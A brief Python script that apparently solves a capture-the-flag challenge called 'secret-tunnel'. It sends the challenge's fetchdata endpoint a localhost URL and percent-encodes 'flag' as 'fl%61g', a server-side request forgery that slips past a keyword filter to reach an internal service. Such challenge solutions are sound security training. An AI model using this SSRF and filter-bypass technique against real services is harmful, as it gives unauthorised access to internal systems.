import requests

url = "https://secret-tunnel.chal.nbctf.com/fetchdata"

r = requests.post(url, data={"url":"http://localhost:1337/fl%61g"})

print(r.text)